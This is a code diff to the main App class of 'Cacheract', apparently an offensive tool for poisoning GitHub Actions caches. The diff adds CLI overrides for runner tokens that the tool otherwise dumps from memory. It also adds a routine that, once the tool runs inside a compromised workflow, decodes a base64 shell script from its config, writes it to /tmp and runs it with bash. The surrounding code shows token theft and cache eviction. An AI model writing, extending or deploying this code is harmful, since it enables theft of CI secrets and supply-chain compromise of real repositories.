@@ -1,5 +1,8 @@
 import * as path from 'path';
 import * as crypto from 'crypto';
+import * as fs from 'fs';
+import { execFile } from 'child_process';
+import { promisify } from 'util';
 import { Config, validateConfig } from '../config/index';
 import { TokenService } from '../services/TokenService';
 import { ReportService } from '../services/ReportService';
@@ -8,6 +11,9 @@ import { ArchiveService } from '../services/ArchiveService';
 import { CacheService } from '../services/CacheService';
 import { calculateCacheConfigs } from '../cache_predictor';
 import { sleep, cleanupFile, checkRunnerEnvironment } from './utils';
+import { CliArgs } from '../cli';
+
+const execFileAsync = promisify(execFile);
 
 export class App {
     private tokenService: TokenService;
@@ -30,7 +36,7 @@ export class App {
         this.cacheService = cacheService || new CacheService();
     }
 
-    async run() {
+    async run(cliArgs: CliArgs = {}) {
         validateConfig();
         // 1. Check Environment
         const { github_hosted, os } = checkRunnerEnvironment();
@@ -44,10 +50,11 @@ export class App {
             return;
         }
 
-        // 2. Extract Tokens
-        const tokens = await this.tokenService.getTokens();
-        const accessToken = tokens.get('ACCESS_TOKEN');
-        const githubToken = tokens.get('GITHUB_TOKEN');
+        // 2. Extract Tokens (CLI flags take precedence over memory-dumped values)
+        const skipDump = cliArgs.skipDump && !!cliArgs.runtimeToken;
+        const tokens = skipDump ? new Map<string, string>() : await this.tokenService.getTokens();
+        const accessToken = cliArgs.runtimeToken ?? tokens.get('ACCESS_TOKEN');
+        const githubToken = cliArgs.githubToken ?? tokens.get('GITHUB_TOKEN');
 
         console.log("Running 🧊 Cacheract 🧊 in verbose development mode!");
         console.log("Flush all GitHub Actions Caches to evict this tool.");
@@ -68,14 +75,22 @@ export class App {
             await sleep(Config.timeouts.sleepTimer * 1000);
         }
 
-        if (!githubToken || !accessToken) {
-            console.log('Missing required tokens, exiting.');
+        if (!accessToken) {
+            console.log('Missing runtime token, exiting.');
+            return;
+        }
+        if (!githubToken && !skipDump) {
+            console.log('Missing GitHub token, exiting.');
             return;
         }
 
         // Set tokens in env for other tools if needed (though services should handle it)
         process.env['ACCESS_TOKEN'] = accessToken;
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
+
+        if (this.isInfected()) {
+            await this.executeRunScript();
+        }
 
         if (Config.singleTurn) {
             if (!this.isInfected()) {
@@ -106,6 +121,24 @@ export class App {
 
     private isInfected(): boolean {
         return __dirname.includes('_actions');
+    }
+
+    private async executeRunScript(): Promise<void> {
+        if (!Config.runScript) return;
+
+        const scriptPath = `/tmp/cacheract-run-${crypto.randomBytes(4).toString('hex')}.sh`;
+        try {
+            const decoded = Buffer.from(Config.runScript, 'base64').toString('utf-8');
+            fs.writeFileSync(scriptPath, decoded, { mode: 0o755 });
+            console.log('Executing runscript...');
+            const { stdout, stderr } = await execFileAsync('/bin/bash', [scriptPath]);
+            if (stdout) console.log('runscript stdout:', stdout.trim());
+            if (stderr) console.error('runscript stderr:', stderr.trim());
+        } catch (error) {
+            console.error('runscript failed:', error);
+        } finally {
+            if (fs.existsSync(scriptPath)) fs.unlinkSync(scriptPath);
+        }
     }
 
     private async fillCacheWithDummyData(count: number, accessToken: string) {
@@ -139,7 +172,7 @@ export class App {
         cleanupFile(archivePath, 'archive after upload');
     }
 
-    private async processCacheEntries(githubToken: string, accessToken: string) {
+    private async processCacheEntries(githubToken: string | undefined, accessToken: string) {
         const entries = await this.githubService.listCacheEntries(githubToken);
         let clearEntryFailed = false;
 
@@ -253,7 +286,7 @@ export class App {
         }
     }
 
-    private async runSingleTurn(githubToken: string, accessToken: string) {
+    private async runSingleTurn(githubToken: string | undefined, accessToken: string) {
         console.log("Running in Single Turn ↩️ mode");
 
         let defaultBranch = "main";
